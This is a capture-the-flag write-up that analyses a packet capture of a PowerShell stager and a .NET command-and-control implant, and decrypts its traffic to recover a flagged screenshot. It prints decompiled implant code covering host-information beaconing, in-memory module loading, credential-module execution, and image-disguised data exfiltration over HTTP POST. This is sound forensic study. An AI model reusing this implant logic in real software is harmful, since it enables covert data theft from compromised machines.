# Interstellar C2 (hard)
For this challenge we get a traffic capture file.
So let's open this in wireshark.

One of the first packets we see is an HTTP request for some powershell file.
I have saved this in `stage1.ps1`
I didn't deobfuscate this file, because it wasn't too hard to see what was happening.
* A file named `94974f08-5853-41ab-938a-ae1bd86d8e51` is downloaded
* A new AES cipher is created key and iv in the file, hard coded
* The decrypted content is saved in the temp folder under some hard coded filename
* The file is executed

Now I go back to wireshark to extract this encrypted file from packet 62.
I have also created the `grab.py` to decrypt this file.
The AES cipher uses padding by default even though it is not explicitly set in the powershell stage.
The result is saved to `stage2.bin`.

The resulting binary is a .NET assembly, let's load it into ILSpy
It will jump through some setup code and then call the `primer` function.

First it will use a predefined key and send some basic information about the host to the C2
```cs
string text4 = array[i];
string un = $"{userDomainName};{text};{environmentVariable};{environmentVariable2};{id};{processName};1";
string key = "DGCzi057IDmHvgTVE2gm60w8quqfpMD+o8qCBGpYItc=";
text3 = text4;
string address = text3 + "/Kettie/Emmie/Anni?Theda=Merrilee?c";
try
{
    string enc = GetWebRequest(Encryption(key, un)).DownloadString(address);
    text2 = Decryption(key, enc);
}
catch (Exception ex)
{
    Console.WriteLine($" > Exception {ex.Message}");
    continue;
}
```

Then the server responds with some setup information to our bot.

```cs
Regex regex = new Regex("RANDOMURI19901(.*)10991IRUMODNAR");
Match match = regex.Match(text2);
string randomURI = match.Groups[1].ToString();
regex = new Regex("URLS10484390243(.*)34209348401SLRU");
match = regex.Match(text2);
string stringURLS = match.Groups[1].ToString();
regex = new Regex("KILLDATE1665(.*)5661ETADLLIK");
match = regex.Match(text2);
string killDate = match.Groups[1].ToString();
regex = new Regex("SLEEP98001(.*)10089PEELS");
match = regex.Match(text2);
string sleep = match.Groups[1].ToString();
regex = new Regex("JITTER2025(.*)5202RETTIJ");
match = regex.Match(text2);
string jitter = match.Groups[1].ToString();
regex = new Regex("NEWKEY8839394(.*)4939388YEKWEN");
match = regex.Match(text2);
string key2 = match.Groups[1].ToString();
regex = new Regex("IMGS19459394(.*)49395491SGMI");
match = regex.Match(text2);
string stringIMGS = match.Groups[1].ToString();
ImplantCore(text3, randomURI, stringURLS, killDate, sleep, key2, stringIMGS, jitter);
```

The most interesting here is the `NEWKEY` field, which is going to set the symmetic key for further communication.

Let's discuss a bit about how the encrypt/decrypt protocol works.
The cipher:
* AES CBC
* Padding: Zeros - pad with zeroes until proper length is reached
* Block size: 128
* Key size: 256

Message layout:
* 16 bytes - IV
* Rest - encrypted message content

Now that we know how the encryption is carried out we can decrypt the parameters sent by the C2.
I wrote the `dec_command.py` script to carry out this task.
The encrypted response I have saved from wireshark in the `first_command` file.
The decrypted output is in `c2_init_config`.
Inspecting the config file we know the new key that will be used for the rest of the communication.

Next up the bot will call the `ImplantCore` function, which will start periodically polling the server with `GET` requests for potential commands.

```cs
if (!text.ToLower().StartsWith("multicmd"))
{
    continue;
}
string text2 = text.Replace("multicmd", "");
string[] array = text2.Split(new string[1] { "!d-3dion@LD!-d" }, StringSplitOptions.RemoveEmptyEntries);
string[] array2 = array;
```

The bot will only execute commands starting with `multicmd`.
Then it will split on some pre-defiend string and process the commands one-by-one

```cs
foreach (string text3 in array2)
{
    taskId = text3.Substring(0, 5);
    cmd = text3.Substring(5, text3.Length - 5);
    // ...
}
```

The first five characters will be the task ID of the command, and the rest is the actual command.
The taskID is probably used by the C2 to keep track of which commands are replied to by the bot once the command finishes.
I have written the `decmd.py` script that will decrypt and interpret the `multicmd` response sent by the server.

I have dumped `cmd{1..3}.enc` packets from the C2, from wireshark.
These are from the HTTP replies that correspond to `GET` requests, are considerably large and contain the proper base64 reply.
Many HTTP replies seem to be there as a distraction either just saying `200 OK` or some random HTML with base64 looking strings, I have ignored these.

1. The first command seems to load 2 modules and then invoke the `loadpowerstatus` command.
2. The second command loads another module and then `run-dll` on the SharpSploit.Credentails class
3. The third command grabs a screenshot

Module loading base64 decodes the input, and then loads the assembly into the current context
```cs
string s = Regex.Replace(cmd, "loadmodule", "", RegexOptions.IgnoreCase);
Assembly assembly = Assembly.Load(Convert.FromBase64String(s));
Exec(stringBuilder.ToString(), taskId, Key);
```

`run-dll` will call the `rAsm` function which will look into the assemblies in the current application domain and execute the one that matches the input.

Oddly enough `loadpowerstatus` and `get-screenshot` do not seem to correspond to any predefined commands.
```cs
string text4 = rAsm($"run-exe Core.Program Core {cmd}");
```

In this case the `else` branch is executed and `run-exe` will be called on the `Core.Program` assembly.
`run-exe` works similarly to `run-dll` the difference being that dll allows a member function to be called, whereas exe calls the entrypoint in all cases with the input passed in the first argument to the entrypoint.

At this point I had a choice to make, either dive into the assemblies (3 of them) or look into how the client responds to the C2.
For some reason my intuition told me to look into how replies work, but it also could have been the case that the flag was hiding in one of the assemblies.

To send replies from the client to the C2 the `Exec` function is called.
```cs
if (string.IsNullOrEmpty(key))
{
    key = pKey;
}
string cookie = Encryption(key, taskId);
string text = "";
text = ((encByte == null) ? Encryption(key, cmd, comp: true) : Encryption(key, null, comp: true, encByte));
byte[] cmdoutput = Convert.FromBase64String(text);
byte[] imgData = ImgGen.GetImgData(cmdoutput);
int num = 0;
while (num < 5)
{
    num++;
    try
    {
        GetWebRequest(cookie).UploadData(UrlGen.GenerateUrl(), imgData);
        num = 5;
    }
    catch
    {
    }
}
```

1. A cookie is generated, which is just the task ID encrypted. This will be used to identify the response and it is provided through setting a cookie in the web request
2. The input data is encrypted, possibly a string or an array of bytes
3. The result is converted back to a byte array
4. The byte array is combined with image data
5. The client tries to send the request as `POST` five times until it succeeds.

Important difference to note here is that replies are compressed before they are sent to the server.
This is done using the `Compress` function which just GZIP compresses the data.

Let's look into how the image generator works
```cs
internal static byte[] GetImgData(byte[] cmdoutput)
{
    int num = 1500;
    int num2 = cmdoutput.Length + num;
    string s = _newImgs[new Random().Next(0, _newImgs.Count)];
    byte[] array = Convert.FromBase64String(s);
    byte[] bytes = Encoding.UTF8.GetBytes(RandomString(num - array.Length));
    byte[] array2 = new byte[num2];
    Array.Copy(array, 0, array2, 0, array.Length);
    Array.Copy(bytes, 0, array2, array.Length, bytes.Length);
    Array.Copy(cmdoutput, 0, array2, array.Length + bytes.Length, cmdoutput.Length);
    return array2;
}
```

1. Choose a random image from the configured list. Recall that this was configured through the very first reply to the client from the C2.
2. Get the bytes of the image
3. Create a random string, so that the image and the string combined take up 1500 bytes
4. The image, then the padding, then the command output are copied to the final result array.

Okay, so now we know how the client sends replies.
I wrote the `deresp.py` script to decode responses from the client to the C2.
I have saved some `POST` request bodies in the `resp{1,3,4,5}.enc` files, I have focused on bodies that had length greater than 1516 (the empty string response)

I began using my script to decode the replies and `resp5.enc` was suspiciously long.
Upon decoding it I saw a PNG header, so I knew this must have been the response to the `get-screenshot` command.
I then saved the decoded result into `response5.png`

Sure enough this image contained the flag as a sticky note on the top right, so we win :)
